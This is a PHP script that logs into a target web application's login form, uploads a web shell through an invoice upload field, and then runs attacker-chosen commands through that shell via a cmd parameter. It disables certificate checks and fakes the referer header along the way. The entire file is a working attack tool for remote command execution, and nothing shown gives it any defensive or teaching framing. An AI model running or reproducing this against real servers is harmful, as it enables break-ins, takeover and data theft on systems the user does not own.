<?php
/*
 * Code Source: http://thisinterestsme.com/php-login-to-website-with-curl/
 */
 
//Set a user agent. This basically tells the server that we are using Chrome ;)
define('USER_AGENT', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36');
 
//Where our cookie information will be stored (needed for authentication).
define('COOKIE_FILE', 'cookie.txt');
 
//Target IP
define('IP_ADDRESS', $argv[2]);

//URL of the login form.
define('LOGIN_FORM_URL', IP_ADDRESS.'login/main_login.php');
 
//Login action URL. Sometimes, this is the same URL as the login form.
define('LOGIN_ACTION_URL', IP_ADDRESS.'login/checklogin.php');
 
//Read username and password from input text file
$filepath = $argv[1];
$myfile = fopen($filepath, "r") or die("Unable to open file!");
$username = fgets($myfile);
$password = fgets($myfile);
fclose($myfile);

//The username or email address of the account.
define('USERNAME', $username);
//The password of the account.
define('PASSWORD', $password);

//Upload file
$shellPath = $argv[3];

//An associative array that represents the required form fields.
//You will need to change the keys / index names to match the name of the form
//fields.
$loginValues = array(
    'myusername' => USERNAME,
    'mypassword' => PASSWORD
);

$shellValues = array(
    'invoice' => '@'.realpath($shellPath)
);
echo "Start Login Web Server.\n";
echo "Username:", $username, "Password:", $password, "\n";

//Initiate cURL.
$curl = curl_init();
 
//Set the URL that we want to send our POST request to. In this
//case, it's the action URL of the login form.
curl_setopt($curl, CURLOPT_URL, LOGIN_ACTION_URL);
 
//Tell cURL that we want to carry out a POST request.
curl_setopt($curl, CURLOPT_POST, true);
 
//Set our post fields / date (from the array above).
curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($loginValues));
 
//We don't want any HTTPS errors.
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
 
//Where our cookie details are saved. This is typically required
//for authentication, as the session ID is usually saved in the cookie file.
curl_setopt($curl, CURLOPT_COOKIEJAR, COOKIE_FILE);
 
//Sets the user agent. Some websites will attempt to block bot user agents.
//Hence the reason I gave it a Chrome user agent.
curl_setopt($curl, CURLOPT_USERAGENT, USER_AGENT);
 
//Tells cURL to return the output once the request has been executed.
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 
//Allows us to set the referer header. In this particular case, we are 
//fooling the server into thinking that we were referred by the login form.
curl_setopt($curl, CURLOPT_REFERER, LOGIN_FORM_URL);
 
//Do we want to follow any redirects?
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, false);
 
//Execute the login request.
curl_exec($curl);
 
//Check for errors!
if(curl_errno($curl)){
	echo "Failure of Login...\n";
    throw new Exception(curl_error($curl));
} else{
	echo "Successful Login!\n";
}
 

//We should be logged in by now. Let's attempt to access a password protected page
curl_setopt($curl, CURLOPT_URL, IP_ADDRESS.'upload.php');

//Tell cURL that we want to carry out a POST request.
curl_setopt($curl, CURLOPT_POST, true);
 
//Set our post fields / date (from the array above).
// curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($shellValues));
curl_setopt($curl, CURLOPT_POSTFIELDS, $shellValues);

//Tells cURL to return the output once the request has been executed.
curl_setopt($curl, CURLOPT_RETURNTRANSFER, false);

//Execute the POST request and print out the result.
curl_exec($curl);

//Check for errors!
if(curl_errno($curl)){
	echo "Failure of uploading shell file...\n";
    throw new Exception(curl_error($curl));
} else{
	echo "Success of uploading shell file!\n";
}

// Run shell command

$cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
$shellcmd = $argv[4];

echo shell_exec ($cmd.$shellcmd);

curl_close($curl);